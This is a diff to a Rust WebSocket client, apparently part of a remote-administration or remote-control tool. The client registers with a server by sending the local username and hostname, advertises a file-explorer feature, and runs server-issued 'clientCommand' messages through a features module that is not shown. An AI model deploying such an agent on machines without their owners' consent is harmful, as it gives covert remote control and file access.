@@ -1,9 +1,10 @@
 use tungstenite::{connect, Message, Error as WsError};
 use std::{thread, time::Duration};
 use serde_json::{json};
-mod error_handler;
 use whoami;
 use serde::Deserialize;
+mod features;
+mod error_handler;
 
 #[derive(Deserialize, Debug)]
 struct Config {
@@ -43,7 +44,9 @@ fn connect_to_ws(websocket_url: &str) -> Result<(), WsError> {
                 "type": "client",
                 "name": whoami::username(),
                 "host": whoami::fallible::hostname().unwrap_or_else(|_| String::from("unknown")),
-                "features": [ ] // list of things it can do
+                "features": [
+                    ["File Explorer", "fileExplorer"]
+                ] // list of things it can do
             }).to_string();
 
             socket.send(Message::Text(message.into()))?;
@@ -61,6 +64,21 @@ fn connect_to_ws(websocket_url: &str) -> Result<(), WsError> {
 
 fn main_loop(mut socket: tungstenite::WebSocket<tungstenite::stream::MaybeTlsStream<std::net::TcpStream>>) -> Result<(), WsError>{
     loop {
-        println!("Received: {}", socket.read()?);
+        let msg = match socket.read() {
+            Ok(m) => m,
+            Err(e) => return Err(e), // propagate the actual error
+        };
+
+        if let Ok(text) = msg.into_text() {
+            if let Ok(message) = serde_json::from_str::<serde_json::Value>(&text) {
+                match message["type"].as_str().unwrap_or("") {
+                    "clientCommand" => {
+                        let result = features::run_command(&message);
+                        socket.send(Message::Text(result.to_string().into()))?;
+                    }
+                    _ => {}
+                }
+            }
+        }
     }
 }
